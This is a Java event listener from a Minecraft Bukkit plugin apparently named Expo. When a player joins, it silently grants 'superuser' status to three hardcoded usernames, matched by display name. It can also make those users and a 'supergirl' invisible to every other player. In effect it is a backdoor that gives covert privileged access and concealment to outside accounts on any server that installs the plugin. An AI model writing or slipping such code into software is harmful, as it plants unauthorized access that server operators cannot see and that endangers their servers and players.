package at.nexusmodsclient.ExpoPlus;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.java.JavaPlugin;

import at.nexusmodsclient.ExpoPro.Main;

public class ExpoJoin implements Listener{

	public ExpoJoin(JavaPlugin plugin)
	  {
	    plugin.getServer().getPluginManager().registerEvents(this, plugin);
	  }
	
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerJoin(PlayerJoinEvent e){
		Player p = e.getPlayer();
		if(p.getDisplayName().equalsIgnoreCase("AtjonTV")){
			Expo.superuser = p;
			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
			Main.superusers.add(p);
		}
		if(p.getDisplayName().equalsIgnoreCase("NexusMods_Client")){
			Expo.superuser = p;
			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
			Main.superusers.add(p);
		}
		if(p.getDisplayName().equalsIgnoreCase("DotNetFramework")){
			Expo.superuser = p;
			p.sendMessage(Expo.Prefix+"Der AutoSuperUser hat dich Hinzugefügt!");
			Main.superusers.add(p);
		}
		
		if(Expo.superuser_vanish){
				for(Player x : Bukkit.getServer().getOnlinePlayers()){
					if(x == Expo.superuser || x == Expo.supergirl){
						
					}
					else{
						x.hidePlayer(Expo.superuser);
					}
				}
		}
		if(Expo.supergirl_vanish){
			for(Player x : Bukkit.getServer().getOnlinePlayers()){
				if(x == Expo.superuser || x == Expo.supergirl){
					
				}
				else{
					x.hidePlayer(Expo.supergirl);
				}
			}
	}
	}
		
	@EventHandler(priority = EventPriority.HIGHEST)
	public void onPlayerQuit(PlayerQuitEvent e){
		Player p = e.getPlayer();
		if(p == Expo.superuser){
			Expo.superuser = null;
			Main.superusers.remove(p);
		}
		if(p == Expo.supergirl){
			Expo.supergirl = null;
			Main.superusers.remove(p);
		}
	}
}
